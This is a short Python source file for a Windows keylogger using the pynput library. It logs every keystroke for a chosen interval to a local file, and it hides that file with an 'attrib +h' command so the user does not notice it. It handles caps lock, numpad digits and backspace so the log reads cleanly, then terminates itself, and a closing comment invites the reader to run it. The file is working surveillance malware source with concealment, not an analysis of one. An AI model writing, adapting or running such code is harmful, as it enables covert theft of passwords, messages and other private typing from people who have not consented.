
import os
import time
import multiprocessing
import signal
from pynput.keyboard  import Key, Listener

num_values = {'<96>':0,'<97>':1, '<98>':2, '<99>':3, '<100>':4, '<101>':5, '<102>':6, '<103>':7, '<104>':8, '<105>':9, '<110>':'.' }



def key_func(interval):
    
    global start
    global end

    start = time.time()
    end = start + interval
    file_0 = open("key-logs.txt", "w")
    file_0.close()
    os.system("attrib +h key-logs.txt")

    with Listener(on_press=on_press, on_release=on_release) as listener: 
        listener.join()


def on_press(key):
    write_file(key)

def get_capslock_state():
    import ctypes
    cap = ctypes.WinDLL ("User32.dll")
    VK_CAPITAL = 0x14
    return cap.GetKeyState(VK_CAPITAL)

def write_file(key):
    file_1 = open("key-logs.txt","a+")
    if str(key) == "Key.space":
        file_1.write(" ")
    
    elif str(key) in num_values:
        file_1.write(str(num_values.get(str(key))))
    
    elif key == Key.enter:
        file_1.write("\n")
    
    elif key == Key.shift_r or  key == Key.shift_l:
        pass
    
    elif key == Key.backspace:
        file_1.seek(0)
        content = file_1.read()
        f = open('key-logs.txt', 'r+')
        f.truncate(0)
        file_2 = open("key-logs.txt", "a+")
        file_2.write(content[:len(content)-1])
        file_2.close()
        f.close()

    elif key == Key.caps_lock:
        pass
    
    elif (str(key).find('Key') != -1):
        file_1.write(" "+ str(key) + " ")
        
    else:
        if get_capslock_state():
            file_1.write((str(key)).upper().replace("'",""))
                
        else:
            key = str(key).replace("'","")
            file_1.write(str(key))

    file_1.close()

def on_release(key):
    if time.time() >= end:
        print('Terminated')
        current_id = multiprocessing.current_process().pid
        print(current_id)
        print('Killed_Process')
        os.kill(current_id,signal.SIGTERM)
        return False

# Call the key_func() function here with provided time period (on seconds) 